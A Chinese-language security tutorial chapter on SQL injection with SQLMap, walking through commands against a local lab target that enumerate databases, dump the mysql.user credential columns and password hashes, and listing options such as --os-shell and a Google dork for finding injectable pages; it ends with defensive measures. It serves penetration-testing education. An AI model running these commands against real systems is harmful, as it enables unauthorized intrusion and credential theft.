# Chapter 2: SQL 注入

## 2.1 SQLMap 简介

SQLMap 是开源的自动化 SQL 注入渗透测试工具，支持：
- 检测和利用多种 SQL 注入类型（基于时间、布尔、错误、联合查询）
- 支持 MySQL、PostgreSQL、MS SQL Server、Oracle、DB2、SQLite 等
- 支持 Windows、Linux、macOS

## 2.2 SQLMap 用法

### 基本命令

| 功能 | 命令 |
|------|------|
| 启动帮助 | `sqlmap -h` |
| 测试注入 | `sqlmap -u "http://target.com/vuln.php?id=1"` |
| 爆破数据库 | `--dbs` |
| 爆破表名 | `--tables` |
| 爆破字段 | `--columns` |
| 导出数据 | `--dump` |

### 高级选项

| 功能 | 参数 |
|------|------|
| 使用 Cookie | `--cookie="..."` |
| 随机 User-Agent | `--random-agent` |
| 指定代理 | `--proxy http://127.0.0.1:8080` |
| 探测等级 | `--level 1-5` |
| 风险等级 | `--risk 1-3` |
| 数据库枚举 | `-D dbname -T tablename -C columnname` |
| OS Shell | `--os-shell` |
| Google Dork | `-g "inurl:php?id="` |

**注意：** 仅用于合法渗透测试，需获得授权。

## 2.3 SQLMap 实战

### 实战环境
- 攻击机：Kali Linux (192.168.10.128)
- 靶场：Docker DVWA (192.168.111.1:8081)

### 实战步骤

**1. 判断是否存在注入**
```bash
sqlmap -u http://192.168.111.1:8081/Less-1/?id=1
```

**2. 查询所有数据库**
```bash
sqlmap -u http://192.168.111.1:8081/Less-1/?id=1 --dbs
```

**3. 获取数据库表名**
```bash
sqlmap -u http://192.168.111.1:8081/Less-1/?id=1 -D mysql --tables
```

**4. 获取表字段名**
```bash
sqlmap -u http://192.168.111.1:8081/Less-1/?id=1 -D mysql -T user --columns
```

**5. 获取字段内容**
```bash
sqlmap -u http://192.168.111.1:8081/Less-1/?id=1 -D mysql -T user -C User,Password --dump
```

### 进阶操作

**获取所有用户：**
```bash
sqlmap -u http://192.168.111.1:8081/Less-1/?id=1 --users
```

**获取用户密码：**
```bash
sqlmap -u http://192.168.111.1:8081/Less-1/?id=1 --passwords
```

## SQL 注入防御

1. **参数化查询** - 使用预编译语句
2. **输入验证** - 严格过滤用户输入
3. **最小权限** - 数据库账户最小权限原则
4. **敏感加密** - 密码等敏感信息加密存储
5. **WAF** - 部署 Web 应用防火墙
